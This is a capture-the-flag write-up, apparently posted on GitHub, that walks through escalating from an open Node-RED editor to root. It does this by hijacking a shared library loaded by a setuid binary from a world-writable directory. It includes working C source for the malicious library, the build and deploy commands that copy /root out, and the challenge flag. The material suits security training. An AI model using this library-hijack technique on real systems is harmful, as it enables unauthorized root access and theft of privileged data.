
<img width="1119" height="550" alt="image" src="https://github.com/user-attachments/assets/1f8b0e71-7ad4-4f0b-b576-645fb95047d1" />

<img width="758" height="78" alt="image" src="https://github.com/user-attachments/assets/b85ae032-b1d0-46e8-9b37-5885eafbd405" />



# Challenge Description
> Someone left a flow editor wide open. Get in. Get root. Get the flag.


# Initial enumeration:

```
ls /
# bin dev entrypoint.sh etc home lib media mnt opt proc root run sbin srv sys tmp usr var

cat /entrypoint.sh
```

```sh
#!/bin/sh
set -e

# Ensure /var/lib/node stays world-writable at runtime
chmod 0777 /var/lib/node

# Start Node-RED as svc_node
exec su -s /bin/sh svc_node -c "node-red"
```


Further enumeration found a setuid-root binary that references a shared
library living in that directory:

```
ls -la /usr/local/bin/nodestatus
# -rwsr-xr-x 1 root root 18752 ... /usr/local/bin/nodestatus

ldd /usr/local/bin/nodestatus
# libshared.so => /var/lib/node/libshared.so
# libc.musl-x86_64.so.1 => /lib/ld-musl-x86_64.so.1
```

## Finding the required symbols

Simply dropping in a library that exports *some* function isn't enough 
the loader needs every symbol the binary references. Checking the original
library 

```
objdump -T /usr/local/bin/nodestatus | grep UND
```

```
log_status
printf
connect
puts
socket
inet_addr
print_banner
memset
htons
...
```

Two symbols matter for our purposes: log_status and print_banner
Both must be defined in the replacement `.so`, or the dynamic loader fails
to resolve the binary and it exits early.

Disassembling the original log_status (from the `.bak` copy) also
confirmed its real signature:

```
objdump -d /tmp/libshared.so.bak | sed -n '/<log_status>/,/^$/p'
```

The function reads two arguments off `%rdi`/`%esi` :

```c
void log_status(char *host, int port);
```

## Building the malicious library

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void print_banner(){ puts("OK"); }

void log_status(char *host, int port){
    setgid(0);
    setuid(0);
    system("cp -r /root /tmp/rootcopy 2>&1");
    system("chmod -R 777 /tmp/rootcopy 2>&1");
}
```

---
```c
printf '#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n\nvoid print_banner(){puts("OK");}\n\nvoid log_status(char *host,int port){\n setgid(0);\n setuid(0);\n system("cp -r /root /tmp/rootcopy 2>&1");\n system("chmod -R 777 /tmp/rootcopy 2>&1");\n}\n' > /tmp/exploit.c
```

Build and deploy:

```sh
gcc -shared -fPIC -o /tmp/libshared.so /tmp/exploit.c
cp /tmp/libshared.so /var/lib/node/libshared.so
timeout 3 /usr/local/bin/nodestatus
```

Then read out the loot from the unprivileged side (now world-readable/writable):

```sh
cat /tmp/rootcopy/*
```

## Flag

```
OmniCTF{N0d3_3v3rywh3r3_1d974eea307327134462512614582680}```
```


<img width="1663" height="814" alt="image" src="https://github.com/user-attachments/assets/522bdf87-3c4f-4651-8e27-48fab9d6e01e" />
